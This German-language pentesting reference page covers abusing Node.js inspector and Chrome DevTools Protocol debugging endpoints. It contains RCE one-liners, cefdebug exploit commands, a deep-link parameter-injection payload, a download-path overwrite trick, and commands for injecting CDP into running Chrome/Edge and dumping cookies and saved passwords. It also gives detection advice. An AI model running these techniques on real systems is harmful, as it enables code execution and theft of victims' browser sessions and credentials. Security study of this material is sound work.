# Missbrauch des Node-Inspectors/CEF-Debuggings

{{#include ../../banners/hacktricks-training.md}}

Zu den historischen praktischen Beispielen zählen der Multimaster-Walkthrough und der debuggerbasierte Angriff auf Visual Studio Code CVE-2019-1414. Betrachte sie als versionsspezifischen Kontext und gehe nicht davon aus, dass jedes aktuelle Electron- oder Chromium-Ziel dieselben Primitives bereitstellt.<sup>[[1]](#references)[[3]](#references)</sup>

## Grundlegende Informationen

[Aus der Dokumentation](https://nodejs.org/learn/getting-started/debugging): Wird ein Node.js-Prozess mit dem Schalter `--inspect` gestartet, wartet er auf eine Verbindung durch einen Debugging-Client. **Standardmäßig** lauscht er unter Host und Port **`127.0.0.1:9229`**. Jedem Prozess wird außerdem eine **eindeutige** **UUID** zugewiesen.<sup>[[4]](#references)</sup>

Inspector-Clients müssen Hostadresse, Port und UUID kennen und angeben, um eine Verbindung herzustellen. Eine vollständige URL sieht etwa so aus: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Da der **Debugger vollständigen Zugriff auf die Node.js-Ausführungsumgebung hat**, kann ein Angreifer, der eine Verbindung zu diesem Port herstellen kann, möglicherweise beliebigen Code im Namen des Node.js-Prozesses ausführen (**potenzielle privilege escalation**).<sup>[[4]](#references)</sup>

Es gibt mehrere Möglichkeiten, einen Inspector zu starten:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Wenn du einen untersuchten Prozess startest, erscheint etwa Folgendes:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Prozesse auf Basis von **CEF** (**Chromium Embedded Framework**) können mit `--remote-debugging-port=9222` einen Debugger bereitstellen. Dadurch wird der Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) zugänglich gemacht und nicht über einen Node.js-Inspector. Daher sind Node.js-`process`-basierte Payloads standardmäßig nicht direkt anwendbar.<sup>[[2]](#references)[[5]](#references)</sup>

Wenn Sie einen Browser mit aktiviertem Debugging starten, erscheint etwa Folgendes:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Einen CDP-Endpunkt auflisten und steuern

Die HTTP-Discovery-Endpunkte unterscheiden den **Browser**-WebSocket von den einzelnen WebSockets der **Targets** (Tabs, Worker, Erweiterungen usw.). Frage `/json/version` für den Browser-Endpunkt und `/json/list` für Targets ab; die zurückgegebenen `webSocketDebuggerUrl`-Werte lassen sich dann direkt mit den JSON-RPC-ähnlichen Nachrichten von CDP steuern.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Zum Beispiel kannst du mit `websocat "$BROWSER_WS"` verbinden und `{"id":1,"method":"Target.getTargets"}` oder `{"id":2,"method":"Storage.getCookies"}` senden. Bei einem Page-Target (`websocat "$PAGE_WS"`) wird `Runtime.evaluate` im Renderer ausgeführt und `Page.captureScreenshot` gibt einen base64-kodierten Screenshot zurück. `document.cookie` kann keine `HttpOnly`-Cookies offenlegen, während `Storage.getCookies` den Cookie-Speicher des Browsers abfragt.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Browser, WebSockets und Same-Origin-Policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites, die in einem Webbrowser geöffnet sind, können gemäß dem Browser-Sicherheitsmodell WebSocket- und HTTP-Anfragen stellen. Eine **initiale HTTP-Verbindung** ist erforderlich, um **eine eindeutige Debugger-Sitzungs-ID zu erhalten**. Die **same-origin-policy** **verhindert**, dass Websites **diese HTTP-Verbindung** herstellen können. Als zusätzliche Sicherheitsmaßnahme gegen [**DNS-rebinding-Angriffe**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** prüft Node.js, ob die **'Host'-Header** der Verbindung entweder eine **IP-Adresse** oder exakt **`localhost`** angeben.<sup>[[4]](#references)</sup>

> [!TIP]
> **Diese Sicherheitsmaßnahme verhindert, dass der Inspector ausgenutzt wird**, um Code **nur durch das Senden einer HTTP-Anfrage** auszuführen (was durch Ausnutzung einer SSRF-Schwachstelle möglich wäre).<sup>[[4]](#references)</sup>

### Inspector in laufenden Prozessen starten

Du kannst das **Signal SIGUSR1** an einen laufenden Node.js-Prozess senden, damit dieser **den Inspector** am Standardport startet. Beachte jedoch, dass du über ausreichende Berechtigungen verfügen musst. Dadurch erhältst du möglicherweise **privilegierten Zugriff auf Informationen innerhalb des Prozesses**, aber keine direkte Rechteausweitung.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Dies ist in Containern nützlich, da **das Beenden des Prozesses und das Starten eines neuen Prozesses** mit `--inspect` **keine Option** ist, weil der **Container** zusammen mit dem Prozess **beendet** wird.<sup>[[6]](#references)</sup>

### Verbindung zum Inspector/Debugger herstellen

Um eine Verbindung zu einem **Chromium-basierten Browser** herzustellen, können für Chrome bzw. Edge die URLs `chrome://inspect` oder `edge://inspect` aufgerufen werden. Durch Klicken auf die Schaltfläche „Configure“ sollte sichergestellt werden, dass **Zielhost und Port** korrekt aufgeführt sind. Das Bild zeigt ein Remote-Code-Execution-Beispiel (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Nachdem eine URL für den Zugriff auf den Debugger angezeigt wird, z. B. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d – Verbindung zum Inspector/Debugger herstellen: Um eine Verbindung zu einem Chromium-basierten Browser herzustellen, ...](<../../images/image (674).png>)

Über die **Befehlszeile** können Sie eine Verbindung zu einem Debugger/Inspector herstellen:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Das Tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) ermöglicht es, lokal ausgeführte Inspectors zu finden und Code in sie einzuschleusen.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Beachte, dass **NodeJS-RCE-Exploits nicht funktionieren**, wenn du über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) mit einem Browser verbunden bist (du musst die API prüfen, um interessante Anwendungsmöglichkeiten zu finden).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE im NodeJS-Debugger/Inspector

> [!TIP]
> Wenn du hierher gekommen bist, um herauszufinden, wie du [**RCE durch eine XSS in Electron erhältst, sieh dir bitte diese Seite an.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Einige gängige Möglichkeiten, **RCE** zu erlangen, wenn du dich mit einem Node-**Inspector** **verbinden** kannst, sind etwa die folgenden (es sieht so aus, als würde dies **bei einer Verbindung über das Chrome DevTools Protocol nicht funktionieren**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

Die API findest du hier: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In diesem Abschnitt liste ich einfach interessante Dinge auf, mit denen Leute dieses Protokoll ausgenutzt haben.

### Chrome 136+ Einschränkung für Standardprofile

Ab **Chrome 136** ignoriert Chrome `--remote-debugging-port` und `--remote-debugging-pipe`, wenn sie auf das **standardmäßige Chrome-Datenverzeichnis** abzielen. Die Option muss mit einem nicht standardmäßigen `--user-data-dir` kombiniert werden. Dessen separater Verschlüsselungsschlüssel und isolierter Browserstatus verhindern, dass diese einfache Flag-basierte Technik das normale authentifizierte Profil des Benutzers offenlegt. Es sollte nicht ohne Überprüfung davon ausgegangen werden, dass diese Chrome-spezifische Einschränkung auch für ältere Chrome-Versionen, Chrome for Testing, Electron/CEF-Anwendungen oder andere Chromium-Derivate gilt.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Daher beweist ein aktueller Chrome-Prozess, der nur mit `--remote-debugging-port` gestartet wurde, **nicht**, dass CDP aktiv wurde. Überprüfen Sie den Listener und `/json/version` und ermitteln Sie, welches Profil tatsächlich dahinterliegt.<sup>[[14]](#references)</sup>

### Parameter Injection über Deep Links

Bei [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) entdeckte Rhino Security, dass eine auf CEF basierende Anwendung eine benutzerdefinierte UR**I** im System registrierte (workspaces://index.html), die die vollständige URI erhielt und dann die auf CEF basierende Anwendu**ng** mit einer Konfiguration startete, die teilweise aus dieser URI zusammengesetzt wurde.<sup>[[8]](#references)</sup>

Es wurde entdeckt, dass die URI-Parameter URL-dekodiert und zum Starten der einfachen CEF-Anwendung verwendet wurden, sodass ein Benutzer das Flag **`--gpu-launcher`** in die **Befehlszeile** einschleusen und beliebige Dinge ausführen konnte.<sup>[[8]](#references)</sup>

Ein Payload könnte also so aussehen:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Wird calc.exe ausführen.<sup>[[8]](#references)</sup>

### Dateien überschreiben

Ändere den Ordner, in dem **heruntergeladene Dateien gespeichert werden**, und lade eine Datei herunter, um häufig verwendeten **Quellcode** der Anwendung mit deinem **bösartigen Code** zu **überschreiben**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver-RCE und Exfiltration

STAR Labs zeigte, dass offengelegte WebDriver/CDP-Dienste beliebige Dateizugriffe und RCE ermöglichen können; DNS rebinding kann die Exploit-Kette in einigen Konfigurationen vervollständigen.<sup>[[9]](#references)</sup>

Der WebDriver-Dienst von ChromeDriver ist von Chrome DevTools/CDP getrennt. Die Capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) wählt die Browser-Executable aus, die für eine neue Sitzung gestartet wird. Kann ein unprivilegierter Aufrufer einen als root laufenden ChromeDriver-Dienst erreichen und eine Sitzung mit einem vom Aufrufer kontrollierten Executable-Pfad übermitteln, kann dieser Start die Privilegiengrenze des Dienstes überschreiten. Eine leere Antwort auf `/sessions` klärt nicht, ob neue Sitzungen erstellt werden können. Prüfe Prozessbesitzer, tatsächliche Erreichbarkeit des Listeners, Sitzungsautorisierung, Zugriff auf die Executable und Beschränkungen, bevor du zu dem Schluss kommst, dass der Pfad nutzbar ist; ein Prozessname oder ein üblicher Port allein reichen nicht aus. [Googles Sicherheitshinweise](https://developer.chrome.com/docs/chromedriver/security-considerations) empfehlen, ChromeDriver unter einem unprivilegierten Konto auszuführen. Passive Enumeration sollte keine WebDriver-Sitzung erstellen.

Weitere historische Beispiele zu Browser-Automatisierung und Chromium-Sicherheit findest du im Counter-WebDriver-Bericht sowie in den Project-Zero-Issues 773, 1742 und 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### CDP in einem laufenden Chromium-Prozess aktivieren

Die Einschränkung von Chrome für Standardprofile blockiert nur den Aktivierungspfad über die Kommandozeile. Mit ausreichendem Zugriff desselben Benutzers, um den Browserprozess zu manipulieren, rufen das ursprüngliche [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) und das Cobalt-Strike-[**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) Chromium-intern `content::DevToolsAgentHost::StartRemoteDebuggingServer` auf, das nicht exportiert wird, und zwar innerhalb des bereits laufenden `chrome.exe` oder `msedge.exe`. Der Endpunkt gehört damit zum tatsächlichen Profil und behält dessen Tabs, Erweiterungen, Cookies und authentifizierten Zustand bei.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Bei gewöhnlichen x64-Chrome-/Edge-Prozessen findet der BOF das Browserfenster und die geladene `chrome.dll`/`msedge.dll`, durchsucht die Remote-PE-Datei nach maskierten Signaturen, weist Stubs und einen Kontextblock zu, ersetzt vorübergehend die Fensterprozedur und führt den abschließenden Aufruf im **UI-Thread** des Browsers aus. Zu den relevanten Laufzeit-Eingaben gehören `StartRemoteDebuggingServer`, Chromiums `operator new`, `TCPServerSocketFactory::CreateForHttpServer` und die Factory-Vtable. Die Ausführung wird abgebrochen, wenn eine erforderliche Signatur nicht genau einmal gefunden wird.<sup>[[15]](#references)[[16]](#references)</sup>

Der BOF akzeptiert einen Browsermodus und einen optionalen Port. Anschließend kann das Hilfsskript den Endpunkt verifizieren und Cookies erfassen; `chrome-iso` ist ein separater Pfad für Chromes Windows-Process-Isolation-Grenze.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Der `chrome-iso`-Pfad verwendet ausschließlich Handles mit eingeschränkten Abfr obwohl auf den isolierten Prozess. Er ermittelt die installierte `chrome.dll`, deren PE-Imagegröße mit der des laufenden Prozesses übereinstimmt, löst Symbole aus diesem lokalen Image auf und nutzt Chromiums `WindowImpl`-Dispatch sowie synchrones `WM_COPYDATA` und einen bestehenden User32-Hook im Image, um den UI-Thread zu erreichen.<sup>[[16]](#references)</sup>

> [!WARNING]
> Dies ist eine **Technik zur Manipulation eines Browserprozesses nach einer Kompromittierung**, kein unauthentifizierter Netzwerk-Bypass. Sie ist buildabhängig, da die relevanten C++-Symbole nicht exportiert werden und sich nach Browser-Updates ändern können.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Signaturen nach Browser-Updates aktualisieren

Verwende die exakte Version von `chrome.dll` oder `msedge.dll`, die auf dem Zielsystem installiert ist, sowie die zugehörige PDB. `symchk.exe` aus dem Windows SDK lädt die Symbole herunter; die Repository-Skripte lokalisieren anschließend `StartRemoteDebuggingServer`, leiten die Eingaben für den Allocator bzw. die Socket-Factory ab oder validieren jede in der BOF eingebettete Signatur.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Ein Ergebnis mit null oder mehreren Treffern darf nicht durch eine beliebige Adresse ersetzt werden. Wenn sich ein bekanntes `operator new`- oder `CreateForHttpServer`-Muster zu stark geändert hat, um eine neue Maske zu erstellen, verwende `pe_signature_finder.py` mit der PDB, um das Symbol zu untersuchen und eine Bytefolge abzuleiten, die im Zielmodul eindeutig ist.<sup>[[16]](#references)[[18]](#references)</sup>

#### Extraktion aus authentifiziertem Browser mit CDP Toolkit

Diese Technik entschlüsselt App-Bound Encryption (ABE) nicht offline und entfernt auch keine Gerätebindung. Stattdessen behandelt sie den legitimen Browser als **Entschlüsselungsorakel und authentifizierten Interaktionsproxy**: `Storage.getCookies` fragt den laufenden Browser nach seinem Cookie-Speicher, während Navigations-/Screencast-Workflows Anfragen, Speicher, Enterprise-Authentifizierung und gerätegebundenes Verhalten im vorhandenen Browser des Opfers belassen.<sup>[[17]](#references)[[18]](#references)</sup>

Nachdem der Loopback-CDP-Listener über den Pivot des Operators weitergeleitet wurde, kann [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) gängige Artefakte aufzählen und erfassen.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` und `tabs screenshot` sind größtenteils Wrapper um `/json/version`, die Zielliste, `Storage.getCookies` und `Page.captureScreenshot`. Für History, Bookmarks, Extensions und Passwort-Metadaten ist dagegen ein temporäres `chrome://`-/`edge://`-WebUI-Ziel erforderlich: Das Toolkit wartet, bis die Oberfläche gerendert wurde, untersucht ihr Modell oder DOM, sammelt das Ergebnis und schließt das Ziel.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` geht noch weiter: Es öffnet den tatsächlichen Ursprung der gespeicherten Anmeldung, fokussiert ein Anmeldedatenfeld, wählt den nativen Autofill-Vorschlag mit CDP-Eingabeereignissen aus und liest die ausgefüllten Werte aus. Ursprung/Port/Pfad müssen der Realm der gespeicherten Passwörter genau entsprechen; der sichtbare Modus ist die zuverlässige Standardeinstellung, da das Vorschlags-Popup native Browser-UI ist.<sup>[[17]](#references)[[18]](#references)</sup>

Für Live-Interaktion streamt `browser-takeover screencast` Frames und sendet Eingaben an ein tatsächliches Ziel (einschließlich Hintergrund- oder Off-Screen-Modus). `browser-takeover proxy` akzeptiert stattdessen lokal HTTP und HTTPS `CONNECT` und führt Upstream-Anfragen über verborgene Chrome-Ziele aus. Wenn verborgene Ziele nicht verfügbar sind, greift es auf Hintergrund-Tabs zurück. Dadurch bleibt der Netzwerk-/Authentifizierungskontext des Opfers erhalten, die Darstellung komplexer clientseitiger Anwendungen ist jedoch weniger originalgetreu, da der Browser des Operators die zurückgegebenen Inhalte rendert.<sup>[[17]](#references)[[18]](#references)</sup>

Zur Erkennung sollten Sie sich nicht allein auf Telemetriedaten zu `--remote-debugging-*`-Befehlszeilenoptionen verlassen: Korrelieren Sie auch ungewöhnliche Handles und Speicheroperationen mit Browserprozessen (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, Thread-Erstellung), DLL-Injection und unerwarteten Loopback-Listening-Sockets im Besitz von Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

In einer realen Umgebung und **nach der Kompromittierung** eines Benutzer-PCs mit einem Chromium-basierten Browser bestand eine historische Technik darin, den Browser mit aktiviertem Debugging neu zu starten und den Loopback-Port weiterzuleiten. Bei Produkten/Builds, die das ausgewählte Profil noch akzeptieren, kann dadurch der Browserverlauf des Opfers offengelegt werden. Chrome 136+ akzeptiert dies jedoch nicht für sein Standarddatenverzeichnis.<sup>[[7]](#references)[[14]](#references)</sup>

Der ursprüngliche Neustartbefehl ist unten für ältere bzw. versionsspezifische Ziele beibehalten. Der zweite Befehl ist die unterstützte Form für aktuelle Chrome-Versionen, erstellt aber ein isoliertes Profil, anstatt den normalen authentifizierten Zustand des Opfers wiederherzustellen.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Für den macOS-spezifischen Chromium-Relaunch sowie Extension- und CDP-Techniken siehe [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium-Debugger-Inspektions- und Exploitation-Tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution in Visual Studio Code über den Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js-Debugging-Leitfaden – Erste Schritte](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF-2021-Writeup – saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome-Debugging-Funktion missbrauchen, um Browsing-Sitzungen remote zu beobachten und zu steuern](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution in AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Sprichst du mit mir? – WebDriver-RCE über DNS-Rebinding und CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [WebDriver abwehren – Vom Bot zu RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Änderungen an Remote-Debugging-Switches zur Verbesserung der Sicherheit – Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [CDP in einen laufenden Edge-Browser injizieren: Ein tiefer Einblick in die Instrumentierung der Browser-Laufzeit](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps – Die Rückkehr des Cookie-Monsters](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
